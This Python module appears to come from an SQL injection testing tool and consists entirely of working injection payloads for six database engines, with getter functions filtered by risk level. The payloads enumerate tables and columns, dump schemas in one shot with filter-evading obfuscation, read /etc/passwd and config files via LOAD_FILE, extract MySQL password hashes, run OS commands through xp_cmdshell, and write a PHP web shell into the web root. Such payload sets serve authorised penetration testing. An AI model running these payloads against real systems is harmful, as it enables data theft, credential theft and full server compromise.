# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Advanced payloads: stacked queries, DIOS, LFI, privilege escalation,
database contents enumeration, and MySQL enumeration helpers.
"""
from __future__ import annotations

from typing import List

# ---------------------------------------------------------------------------
# Database contents enumeration payloads
# Query information_schema / system catalogs to list tables and columns.
# ---------------------------------------------------------------------------

DB_CONTENTS_PAYLOADS: dict[str, dict[str, List[str]]] = {
    "mysql": {
        "tables": [
            "' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1) AS SIGNED)-- -",
            "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))-- -",
            "' UNION SELECT (SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database()),NULL-- -",
            "(/*!%53ELECT*/+/*!50000GROUP_CONCAT(table_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.TABLES*//**//*!%57HERE*//**//*!TABLE_SCHEMA*//**/LIKE/**/DATABASE())",
        ],
        "columns": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1)))-- -",
            "' UNION SELECT (SELECT GROUP_CONCAT(column_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=database() LIMIT 1),NULL-- -",
        ],
    },
    "mariadb": {
        "tables": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))-- -",
            "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -",
            "' UNION SELECT (SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database()),NULL-- -",
        ],
        "columns": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1)))-- -",
            "' UNION SELECT (SELECT GROUP_CONCAT(column_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=database() LIMIT 1),NULL-- -",
        ],
    },
    "mssql": {
        "tables": [
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
            "' UNION SELECT TOP 1 table_name,NULL FROM information_schema.tables-- -",
            "'; SELECT name FROM sysobjects WHERE xtype='U'-- -",
        ],
        "columns": [
            "' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns))-- -",
        ],
    },
    "postgres": {
        "tables": [
            "' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)-- -",
            "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- -",
            "' AND 1=CAST((SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1) AS int)-- -",
        ],
        "columns": [
            "' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_schema='public' LIMIT 1) AS int)-- -",
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_schema='public' LIMIT 1-- -",
        ],
    },
    "sqlite": {
        "tables": [
            "' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS INTEGER)-- -",
            "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- -",
        ],
        "columns": [
            # SQLite PRAGMA — needs stacked queries or creative injection
            "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' LIMIT 1-- -",
        ],
    },
    "oracle": {
        "tables": [
            "' AND 1=CAST((SELECT table_name FROM all_tables WHERE rownum=1) AS INTEGER)-- -",
            "' UNION SELECT table_name,NULL FROM all_tables WHERE rownum=1-- -",
            "' AND 1=CAST((SELECT table_name FROM user_tables WHERE rownum=1) AS INTEGER)-- -",
        ],
        "columns": [
            "' AND 1=CAST((SELECT column_name FROM all_tab_columns WHERE rownum=1) AS INTEGER)-- -",
            "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE rownum=1-- -",
        ],
    },
}


def get_db_contents_payloads(dbms: str, target: str = "tables") -> List[str]:
    """Return database contents enumeration payloads for *dbms*.

    *target* is either ``"tables"`` or ``"columns"``.
    """
    db_map = DB_CONTENTS_PAYLOADS.get(dbms, {})
    return db_map.get(target, [])


# ---------------------------------------------------------------------------
# Stacked (batched) query payloads
# ---------------------------------------------------------------------------

STACKED_PAYLOADS: dict[str, List[str]] = {
    "mysql": [
        "'; SELECT SLEEP(1)-- -",
        "'; SELECT VERSION()-- -",
    ],
    "mariadb": [
        "'; SELECT SLEEP(1)-- -",
        "'; SELECT VERSION()-- -",
    ],
    "mssql": [
        # MSSQL fully supports stacked queries
        "'; SELECT 1-- -",
        "'; SELECT @@version-- -",
        "'; SELECT name FROM sysobjects WHERE xtype='U'-- -",
        "'; WAITFOR DELAY '0:0:0'-- -",
        # Risk 3: execute OS commands
        "'; EXEC xp_cmdshell('whoami')-- -",
    ],
    "postgres": [
        "'; SELECT 1-- -",
        "'; SELECT version()-- -",
        "'; SELECT current_database()-- -",
        "'; SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1-- -",
    ],
    "sqlite": [
        # SQLite supports multiple statements in some drivers
        "'; SELECT sqlite_version()-- -",
        "'; SELECT name FROM sqlite_master WHERE type='table' LIMIT 1-- -",
    ],
    "oracle": [],  # Oracle does NOT support stacked queries
    "auto": [
        "'; SELECT 1-- -",
        "'; SELECT version()-- -",
        "'; WAITFOR DELAY '0:0:0'-- -",
    ],
}


def get_stacked_payloads(dbms: str, risk: int) -> List[str]:
    """Return stacked query payloads for *dbms* filtered by *risk* level."""
    raw = STACKED_PAYLOADS.get(dbms, STACKED_PAYLOADS["auto"])
    if risk < 3:
        raw = [p for p in raw if "xp_cmdshell" not in p.lower()]
    return raw


# ---------------------------------------------------------------------------
# DIOS (Dump In One Shot) payloads — MySQL/MariaDB only
# ---------------------------------------------------------------------------

DIOS_PAYLOADS: List[str] = [
    # Compact DIOS: dumps table::column pairs from information_schema
    "concat/*!(0x223e,version(),(select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/",
    # DIOS with injector banner header
    "concat/*!(0x3c68323e20496e6a656374657220414c49454e205348414e553c2f68323e,0x3c62723e,version(),(Select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/",
    # Simplified DIOS using /*!12345sELecT*/
    "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)",
]


def get_dios_payloads() -> List[str]:
    """Return DIOS payload list (MySQL/MariaDB)."""
    return DIOS_PAYLOADS


# ---------------------------------------------------------------------------
# LFI (Local File Inclusion) via LOAD_FILE — MySQL/MariaDB only
# Requires FILE privilege on the DB user.
# ---------------------------------------------------------------------------

LFI_PAYLOADS: List[str] = [
    # Basic LFI
    "' UNION SELECT load_file('/etc/passwd'),NULL-- -",
    "' UNION SELECT load_file(0x2f6574632f706173737764),NULL-- -",  # hex /etc/passwd
    # Base64 encoded content (avoids display issues)
    "' UNION SELECT TO_base64(LOAD_FILE('/etc/passwd')),NULL-- -",
    "' UNION SELECT TO_base64(LOAD_FILE('/var/www/html/index.php')),NULL-- -",
    # hex() to handle non-printable chars in config files
    "' UNION SELECT hex(load_file('/etc/passwd')),NULL-- -",
    # MySQL config files
    "' UNION SELECT load_file('/etc/mysql/my.cnf'),NULL-- -",
    "' UNION SELECT load_file('/var/www/html/config.php'),NULL-- -",
    # Windows paths
    "' UNION SELECT load_file('C:/Windows/System32/drivers/etc/hosts'),NULL-- -",
    "' UNION SELECT load_file('C:/xampp/htdocs/index.php'),NULL-- -",
]


def get_lfi_payloads() -> List[str]:
    """Return LFI-via-LOAD_FILE payload list."""
    return LFI_PAYLOADS


# ---------------------------------------------------------------------------
# Privilege escalation probes — MySQL
# ---------------------------------------------------------------------------

PRIVESC_PAYLOADS: List[str] = [
    # Check via INFORMATION_SCHEMA.USER_PRIVILEGES
    "' UNION SELECT (SELECT GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),NULL-- -",
    "' UNION SELECT (SELECT unhex(hex(GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e))) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),NULL-- -",
    "' UNION SELECT (SELECT GROUP_CONCAT(grantee,0x7c,privilege_type,0x7c,is_grantable SEPARATOR 0x0a) FROM information_schema.user_privileges),NULL-- -",
    # Per-schema privileges
    "' UNION SELECT (SELECT GROUP_CONCAT(grantee,0x7c,table_schema,0x7c,privilege_type SEPARATOR 0x0a) FROM information_schema.schema_privileges),NULL-- -",
    # Per-column privileges
    "' UNION SELECT (SELECT GROUP_CONCAT(table_schema,0x7c,table_name,0x7c,column_name,0x7c,privilege_type SEPARATOR 0x0a) FROM information_schema.column_privileges),NULL-- -",
    # DBA (SUPER priv) account check
    "' UNION SELECT (SELECT GROUP_CONCAT(grantee,0x7c,privilege_type,0x7c,is_grantable) FROM information_schema.user_privileges WHERE privilege_type='SUPER'),NULL-- -",
    "' UNION SELECT (SELECT GROUP_CONCAT(host,0x7c,user) FROM mysql.user WHERE Super_priv='Y'),NULL-- -",
    # Check via mysql.user system table (file_priv column)
    "' UNION SELECT (SELECT GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e) FROM mysql.user),NULL-- -",
    # Time-based file_priv check: delays if root has file write
    "' AND if(MID((SELECT file_priv FROM mysql.user WHERE user='root'),1,1)='Y',SLEEP(5),NULL)-- -",
    # Global variables for path discovery
    "' UNION SELECT @@slave_load_tmpdir,NULL-- -",
    "' UNION SELECT @@datadir,NULL-- -",
    "' UNION SELECT @@basedir,NULL-- -",
    "' UNION SELECT @@tmpdir,NULL-- -",
    "' UNION SELECT @@hostname,NULL-- -",
    # Write to filesystem (INTO DUMPFILE / INTO OUTFILE) — risk 3
    "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',NULL INTO DUMPFILE '/var/www/html/shell.php'-- -",
    "' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e,NULL INTO DUMPFILE '/var/www/html/shell.php'-- -",
]


def get_privesc_payloads(risk: int = 1) -> List[str]:
    """Return privilege escalation probe payloads filtered by *risk* level.

    INTO DUMPFILE / OUTFILE write payloads are only included at risk >= 3.
    """
    write_markers = ("INTO DUMPFILE", "INTO OUTFILE", "DUMPFILE", "OUTFILE")
    if risk < 3:
        return [p for p in PRIVESC_PAYLOADS if not any(m in p for m in write_markers)]
    return PRIVESC_PAYLOADS


# ---------------------------------------------------------------------------
# MySQL enumeration payloads
# ---------------------------------------------------------------------------

ENUM_PAYLOADS: dict[str, List[str]] = {
    "version": [
        "' UNION SELECT @@version,NULL-- -",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -",
        "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)-- -",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ],
    "current_user": [
        "' UNION SELECT user(),NULL-- -",
        "' UNION SELECT system_user(),NULL-- -",
        "' UNION SELECT current_user(),NULL-- -",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -",
        "' AND UPDATEXML(1,CONCAT(0x7e,user()),1)-- -",
    ],
    "hostname": [
        "' UNION SELECT @@hostname,NULL-- -",
        "' UNION SELECT @@global.hostname,NULL-- -",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@hostname))-- -",
    ],
    "current_database": [
        "' UNION SELECT database(),NULL-- -",
        "' UNION SELECT schema(),NULL-- -",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -",
    ],
    "list_databases": [
        "' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -",
        "' UNION SELECT GROUP_CONCAT(schema_name SEPARATOR 0x0a),NULL FROM information_schema.schemata-- -",
        "' UNION SELECT (SELECT GROUP_CONCAT(db) FROM mysql.db),NULL-- -",  # priv
    ],
    "list_users": [
        "' UNION SELECT user,NULL FROM mysql.user-- -",           # priv
        "' UNION SELECT GROUP_CONCAT(user SEPARATOR 0x0a),NULL FROM mysql.user-- -",  # priv
        "' UNION SELECT (SELECT GROUP_CONCAT(grantee) FROM information_schema.user_privileges),NULL-- -",
    ],
    "password_hashes": [
        "' UNION SELECT GROUP_CONCAT(host,0x7c,user,0x7c,password SEPARATOR 0x0a),NULL FROM mysql.user-- -",  # priv
        "' UNION SELECT GROUP_CONCAT(host,0x7c,user,0x7c,authentication_string SEPARATOR 0x0a),NULL FROM mysql.user-- -",  # MySQL 5.7+
    ],
    "find_tables_by_column": [
        # Replace TARGET_COLUMN with the column name of interest (e.g. 'username')
        "' UNION SELECT GROUP_CONCAT(table_schema,0x7c,table_name SEPARATOR 0x0a),NULL FROM information_schema.columns WHERE column_name='TARGET_COLUMN'-- -",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.columns WHERE column_name='TARGET_COLUMN')))-- -",
    ],
    "conditional": [
        # IF() and CASE WHEN probes — confirm boolean-blind works
        "' AND IF(1=1,'foo','bar')='foo'-- -",
        "' AND IF(1=2,'foo','bar')='bar'-- -",
        "' AND CASE WHEN (1=1) THEN 1 ELSE 0 END=1-- -",
        "' AND CASE WHEN (1=2) THEN 1 ELSE 0 END=0-- -",
    ],
    "nth_row": [
        # Template payload — requires substitution of {offset}, {tbl}, {col} at call site.
        # Not injected directly; use get_enum_payloads("nth_row") and call
        # payload.format(offset=N, tbl="table_name", col="column_name") before use.
        "' UNION SELECT {col},NULL FROM {tbl} ORDER BY {col} LIMIT 1 OFFSET {offset}-- -",
    ],
}


def get_enum_payloads(category: str) -> List[str]:
    """Return MySQL enumeration payloads for *category*.

    Categories: ``version``, ``current_user``, ``hostname``,
    ``current_database``, ``list_databases``, ``list_users``,
    ``password_hashes``, ``find_tables_by_column``, ``conditional``,
    ``nth_row``.

    Note: ``nth_row`` payloads are templates containing ``{offset}``,
    ``{tbl}``, and ``{col}`` placeholders.  Call
    ``payload.format(offset=N, tbl=..., col=...)`` before injecting.
    """
    return ENUM_PAYLOADS.get(category, [])
